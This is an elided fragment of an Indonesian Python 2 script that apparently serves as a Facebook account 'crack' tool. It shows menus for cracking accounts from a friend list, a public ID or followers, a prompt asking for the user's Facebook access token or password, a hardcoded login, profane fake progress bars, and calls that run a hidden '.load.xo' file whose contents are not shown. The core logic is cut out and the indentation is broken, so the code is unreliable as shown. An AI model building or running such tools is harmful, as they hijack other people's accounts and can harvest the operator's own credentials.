...
\033[1;94m•───────────────────────────────────────────•
\033[1;94m--------------------------------------------------
\033[1;94m➤\033[1;94m Author   : Rangga-purnama
\033[1;94m➤\033[1;94m Github   : https://github.com/Rangga902
\033[1;94m➤\033[1;94m Fb Page  : https://m.facebook.com/100027655487072
\033[1;94m➤\033[1;94m Hacker   : Halllo  
\033[1;94m--------------------------------------------------
"""
...
def Rangga_purnama():
    os.system("clear")
    print logo
    print("\033[1;97mLogin ke tools anjing:)").center(50)
    print('')
    print("\033[1;97m--------------------------------------------------")
    ...
    if username =="Rangga":
        ...
        if passwordss =="Rangga":
            ...
            os.system("clear")
            print logo 
            print ("\033[1;97m[+]\033[1;92m Username : Rangga\033[1;92m (Berhasil masuk:)")
            print ("\033[1;97m[+]\033[1;92m Password : Rangga\033[1;92m (Berhasil masuk:)")
	    print("\033[1;97m--------------------------------------------------")
            time.sleep(1)
...
def login_via_facebook():
    ...
    os.system('clear')
    print logo
    print ("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mlogin pakai Access Token ")
    print ("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mLogin pakai User And Pass")
    print ("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mKeluar") 
    print("\033[1;97m--------------------------------------------------")
...
def clone_login_via_facebook():
	...
	print("\033[1;97m--------------------------------------------------")
        ...
        os.system("clear")
        print logo
        print("\033[1;92mTunggu_anjing 0_0 10").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;97mTunggu_anjing 0_0 20").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;92mTunggu_guanjing 0_0 30").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;97mTunggu_anjing 0_0 40").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;92mTunggu_anjing 0_0 50").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;97mTunggu_anjing 0_0 60").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;92mTunggu_anjing 0_0 70").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;97mTunggu_anjing 0_0 80").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;92mTunggu_anjing 0_0 90").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;97mBerhasil_memek 0_0 100").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
	...
	time.sleep(5)
        os.system("clear")
        print logo
        abm("\r\033[1;92m[✓] Login Brhasil\033[0;97m")
	os.system('xdg-open https://m.facebook.com/100027655487072')
        time.sleep(1)
        menu()
    elif hack =="2":
...
def loginfb():
    ...
    if "access_token" in q:
        ...
        os.system("clear")
        print logo
        print("\033[1;92mTunggu_anjing 0_0 30").center(50)
        time.sleep(2)
        os.system("clear")
        print logo
        print("\033[1;97mTunggu_anjing 0_0 40").center(50)
...
def we_love_Rangga():
	...
	os.system("python3 .load.xo")
        os.system('clear')
        print logo
	print ("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mCrack Dari Friend List")
	print ("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mCrack Dari Id publik")
	print ("\033[1;97m[3]\033[1;91m-⋄-\033[1;97mCrack Dari Followers")
...
def we_love_Rangga2():
	...
	if select=="1":
		...
		os.system("python3 .load.xo")
                os.system('clear')
                print logo
		print("\t\033[1;93m  Clone Dari Frienlist\033[1;0m")
		print("\033[1;97m--------------------------------------------------")
		...
		os.system("python3 .load.xo")
                os.system('clear')
                print logo
		print("\t\033[1;93m  Clone Dari Id publik\033[1;0m")
		print("\033[1;97m--------------------------------------------------")
		...
		os.system("python3 .load.xo")
                os.system('clear')
                print logo
		print("\t\033[1;93m  Clone Dari Followers\033[1;0m")
		print("\033[1;97m--------------------------------------------------")
		idt = raw_input("\033[1;97m[+]\033[1;97m Masukan ID :\033[1;93m ")
		print("\033[1;97m--------------------------------------------------")
		os.system("clear")
		print logo
		try:
	...
	print("\033[1;97m[+]\033[1;97m Bersabarlah karena kita menunggu hasil, Bukan mengunggu janji manis mantan🤝\033[1;0m")
	print("\033[1;97m--------------------------------------------------")
	print
